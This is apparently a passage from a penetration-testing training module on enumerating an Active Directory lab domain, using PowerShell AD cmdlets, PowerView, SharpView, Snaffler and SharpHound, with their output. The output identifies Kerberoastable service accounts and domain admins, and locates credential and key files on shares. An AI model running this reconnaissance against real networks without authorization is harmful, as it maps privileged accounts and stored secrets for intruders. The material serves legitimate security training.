Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...

Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}
ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL
DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL
DNSRoot                            : INLANEFREIGHT.LOCAL
DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3842939050-3880317879-2865463114
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL
Forest                             : INLANEFREIGHT.LOCAL
InfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,
                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN
                                     EFREIGHT,DC=LOCAL}
LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL
ManagedBy                          :
Name                               : INLANEFREIGHT
NetBIOSName                        : INLANEFREIGHT
ObjectClass                        : domainDNS
ObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a
ParentDomain                       :
PDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}
RIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
SubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}
SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

```
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Sharepoint
Name                 : adfs
ObjectClass          : user
ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
SamAccountName       : adfs
ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
Surname              : Admin
UserPrincipalName    :

DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Jessica
Name                 : BACKUPAGENT
ObjectClass          : user
ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName       : backupagent
ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
UserPrincipalName    :

<SNIP>
```

```
 Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

```
 Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins

<SNIP>
```

```
Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

```
Get-ADGroupMember -Identity "Backup Operators"

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent
SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
```

PowerView

PowerView is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations.

Let's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.
Command 	Description
Export-PowerViewCSV 	Append results to a CSV file
ConvertTo-SID 	Convert a User or group name to its SID value
Get-DomainSPNTicket 	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Domain/LDAP Functions: 	
Get-Domain 	Will return the AD object for the current (or specified) domain
Get-DomainController 	Return a list of the Domain Controllers for the specified domain
Get-DomainUser 	Will return all users or specific user objects in AD
Get-DomainComputer 	Will return all computers or specific computer objects in AD
Get-DomainGroup 	Will return all groups or specific group objects in AD
Get-DomainOU 	Search for all or specific OU objects in AD
Find-InterestingDomainAcl 	Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember 	Will return the members of a specific domain group
Get-DomainFileServer 	Returns a list of servers likely functioning as file servers
Get-DomainDFSShare 	Returns a list of all distributed file systems for the current (or specified) domain
GPO Functions: 	
Get-DomainGPO 	Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy 	Returns the default domain policy or the domain controller policy for the current domain
Computer Enumeration Functions: 	
Get-NetLocalGroup 	Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember 	Enumerates members of a specific local group
Get-NetShare 	Returns open shares on the local (or a remote) machine
Get-NetSession 	Will return session information for the local (or a remote) machine
Test-AdminAccess 	Tests if the current user has administrative access to the local (or a remote) machine
Threaded 'Meta'-Functions: 	
Find-DomainUserLocation 	Finds machines where specific users are logged in
Find-DomainShare 	Finds reachable shares on domain machines
Find-InterestingDomainShareFile 	Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess 	Find machines on the local domain where the current user has local administrator access
Domain Trust Functions: 	
Get-DomainTrust 	Returns domain trusts for the current domain or a specified domain
Get-ForestTrust 	Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser 	Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember 	Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping 	Will enumerate all trusts for the current domain and any others seen.

```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

name                 : Matthew Morgan
samaccountname       : mmorgan
description          :
memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
whencreated          : 10/27/2021 5:37:06 PM
pwdlastset           : 11/18/2021 10:02:57 AM
lastlogontimestamp   : 2/27/2022 6:34:25 PM
accountexpires       : NEVER
admincount           : 1
userprincipalname    : mmorgan@inlanefreight.local
serviceprincipalname :
mail                 :
useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : svc_qualys
MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : sp-admin
MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Secadmins
GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : spong1990
MemberDistinguishedName : CN=Maggie
                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965

<SNIP>
```

```
Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM
```

```
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True
```

```
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2
```

```
 .\SharpView.exe Get-DomainUser -Help

Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum>
```

```
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
[Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))
objectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}
samaccounttype                 : USER_OBJECT
objectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b
useraccountcontrol             : NORMAL_ACCOUNT
accountexpires                 : 12/31/1600 4:00:00 PM
lastlogon                      : 4/18/2022 1:01:21 PM
lastlogontimestamp             : 4/9/2022 1:33:21 PM
pwdlastset                     : 2/28/2022 12:03:45 PM
lastlogoff                     : 12/31/1600 4:00:00 PM
badPasswordTime                : 4/5/2022 7:09:07 AM
name                           : forend
distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
whencreated                    : 2/28/2022 8:03:45 PM
whenchanged                    : 4/9/2022 8:33:21 PM
samaccountname                 : forend
memberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}
cn                             : {forend}
objectclass                    : {top, person, organizationalPerson, user}
badpwdcount                    : 0
countrycode                    : 0
usnchanged                     : 3259288
logoncount                     : 26618
primarygroupid                 : 513
objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}
usncreated                     : 3054181
instancetype                   : 4
codepage                       : 0
```

```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

```

PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler

2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kdb$|289B|3/31/2022 12:09:22 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|299B|3/31/2022 12:05:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|298B|3/31/2022 12:05:10 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.ppk$|275B|3/31/2022 12:04:40 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|301B|3/31/2022 12:09:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key) .key
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\WsusContent)
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keychain$|295B|3/31/2022 12:08:42 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\SetStep.keychain) .keychain
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|279B|3/31/2022 12:05:25 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.psafe3$|301B|3/31/2022 12:09:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keypair$|278B|3/31/2022 12:09:09 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\UnprotectConvertTo.keypair) .keypair
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|280B|3/31/2022 12:05:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|305B|3/31/2022 12:09:27 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|299B|3/31/2022 12:09:14 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf

<SNIP>
```

```
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT

2022-04-18T13:58:22.1163680-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:22.1163680-07:00|INFORMATION|Initializing SharpHound at 1:58 PM on 4/18/2022
2022-04-18T13:58:22.6788709-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:23.0851206-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-04-18T13:58:53.9132950-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 67 MB RAM
2022-04-18T13:59:15.7882419-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-04-18T13:59:16.1788930-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-04-18T13:59:23.9288698-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 112 MB RAM
2022-04-18T13:59:45.4132561-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-04-18T13:59:45.4601086-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-04-18T13:59:45.8663528-07:00|INFORMATION|Status: 3809 objects finished (+16 46.45122)/s -- Using 110 MB RAM
2022-04-18T13:59:45.8663528-07:00|INFORMATION|Enumeration finished in 00:01:22.7919186
2022-04-18T13:59:46.3663660-07:00|INFORMATION|SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing```
